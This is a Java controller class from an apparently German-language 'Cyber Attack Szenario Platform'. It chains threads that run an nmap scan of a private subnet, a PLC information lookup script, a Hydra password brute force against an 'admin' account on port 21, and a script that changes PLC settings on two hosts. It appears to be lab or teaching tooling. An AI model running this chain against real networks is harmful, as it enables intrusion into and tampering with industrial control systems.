package de.schuetzmarvin.caspmainmod;


import de.schuetzmarvin.casphydramod.Hydra;
import de.schuetzmarvin.caspnmapmod.Nmap;
import de.schuetzmarvin.caspscriptsmod.ChangePLCSettingsScriptRunner;
import de.schuetzmarvin.caspscriptsmod.LookupPLCInformationScriptRunner;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class Controller {
    private static Scanner user_Input = new Scanner(System.in);
    private static String user_data;
    private static boolean correct_answer = false;
    static final Object lock2 = new Object();
    static boolean ready_lock_2;
    static final Object lock3 = new Object();
    static boolean ready_lock_3;
    static final Object lock4 = new Object();
    static boolean ready_lock_4;
    static final Object lock5 = new Object();
    static boolean ready_lock_5;
    static Nmap nmap = new Nmap();
    static Hydra hydra = new Hydra();
    static LookupPLCInformationScriptRunner lupisr = new LookupPLCInformationScriptRunner();
    static ChangePLCSettingsScriptRunner cpssr = new ChangePLCSettingsScriptRunner();


    public static void main(String[] args) throws IOException, InterruptedException, ParserConfigurationException, SAXException {
       /* Controller controller = new Controller();
        List<String> allPossibleToolsAndScripts = controller.getAllToolsandScripts();

        System.out.println("Cyber Attack Szenario Platform (CASP) \n \n Herzlich Willkommen! \n\n Mit s + ENTER gelangen Sie zum Tool Chain Abteil. \n Mit e + ENTER beenden Sie CASP. \n \n Bitte entscheiden Sie sich für eine Eingabe (s oder e) und bestätigen Sie diese mit ENTER: ");
        user_data = user_Input.nextLine();
        while (correct_answer == false) {
            if (user_data.equals("s") || user_data.equals("e")) {
                if(user_data.equals("s")) {
                    controller.evaluation_first_answer(user_data, allPossibleToolsAndScripts);
                    correct_answer = true;
                }else{
                    System.exit(0);
                }
            } else {
                System.out.println(new Exception("Falsche Eingabe. Bitte erneut versuchen! \n\n Bitte entscheiden Sie sich für eine Eingabe (s oder e) und bestätigen Sie diese mit Enter:"));
                user_data = user_Input.nextLine();
            }
        }
        System.out.println("\nZum Frotfahren bitte ENTER drücken...");
        user_data = user_Input.nextLine();
        System.out.println("\nUm ein ool der Tool Chain hinzuzufügen müssen Sie lediglich die davor geschriebene Nummer eingeben und Ihre Eingabe mit ENTER bestätigen.\nBitte wählen Sie eines der Tools als erstes Tool aus:");
        int i =0;
        for (String string:allPossibleToolsAndScripts) {
            System.out.println(i+"."+string);
            i++;
        }


    }

    private void evaluation_first_answer(String user_answer, List<String> listAllTandS) {

        switch (user_answer) {
            case "s":
                System.out.print("Für den Zusammenbau des Cyberangriffszenarios stehen folgende Tools zur Verfügung: \n\nTools\n________\n" + listAllTandS.get(0) + "\n" + listAllTandS.get(1) + " \n\n\nSkripte\n_______\n");
                for (int i = 2; i < listAllTandS.size() ; i++) {
                    System.out.println(listAllTandS.get(i));
                }
                break;
            case "e":
                System.out.println("CASP wird beendet. Bis zum nächsten Mal!");
                System.exit(0);
                break;
        }

    }

    protected List<String> getScripts() {
        File directory = new File("scripts\\");
        File[] listOfFiles = directory.listFiles();
        List<String> mainList = new ArrayList<>();

        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                mainList.add(listOfFiles[i].getName());
            }
        }
        return mainList;
    }

    protected List<String> getAllToolsandScripts(){
        List<String> scriptFileNames = getScripts();
        List<String> tools = List.of(nmap.TOOL_NAME,hydra.TOOL_NAME);
        List<String> alltoolsandscripts = new ArrayList<>();

        for (String string: tools) {
            alltoolsandscripts.add(string);
        }
        for (String string: scriptFileNames) {
            alltoolsandscripts.add(string);
        }

        return alltoolsandscripts;
    }


        */

        Thread thread1 = new Thread(() -> {
            try {
                nmap.run("192.168.1.1-5");
                synchronized (lock2) {
                    ready_lock_2 = true;
                    lock2.notify();
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });
        Thread thread2 = new Thread(() -> {
            try {
                while (!ready_lock_2) {
                    Thread.sleep(1000);
                }
                //lupisr.run("lookup_plc_information.py","192.168.1.1 192.168.1.2 192.168.1.3 192.168.1.4");
                lupisr.run("lookup_plc_information.py", null);
                synchronized (lock3) {
                    ready_lock_3 = true;
                    lock3.notify();
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (SAXException e) {
                e.printStackTrace();
            } catch (ParserConfigurationException e) {
                e.printStackTrace();
            }
        });

        Thread thread3 = new Thread(() -> {
            try {
                while (!ready_lock_3) {
                    Thread.sleep(1000);
                }
                hydra.run("192.168.1.2", "bla", "21", "admin");
                synchronized (lock4) {
                    ready_lock_4 = true;
                    lock4.notify();
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });

        Thread thread4 = new Thread(() -> {
            try {
                while (!ready_lock_4) {
                    Thread.sleep(1000);
                }
                cpssr.run("change_plc_settings.py", "192.168.1.30");
                synchronized (lock5) {
                    ready_lock_5 = true;
                    lock5.notify();
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (SAXException e) {
                e.printStackTrace();
            } catch (ParserConfigurationException e) {
                e.printStackTrace();
            }
        });

        Thread thread5 = new Thread(() -> {
            try {
                while(!ready_lock_5){
                    Thread.sleep(1000);
                }
                cpssr.run("change_plc_settings.py", "192.168.1.2");
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (SAXException e) {
                e.printStackTrace();
            } catch (ParserConfigurationException e) {
                e.printStackTrace();
            }
        });

        thread1.start();
        thread2.start();
        thread3.start();
        thread4.start();
        thread5.start();


        //nmap.run("192.168.1.1-5");
        //lupisr.run("lookup_plc_information.py",null);
        //lupisr.run("lookup_plc_information.py","192.168.1.1 192.168.1.2 192.168.1.3 192.168.1.4");
        //hydra.run("192.168.1.2", "bla","21", "admin");
        //cpssr.run("change_plc_settings.py","192.168.1.30");

    }
}
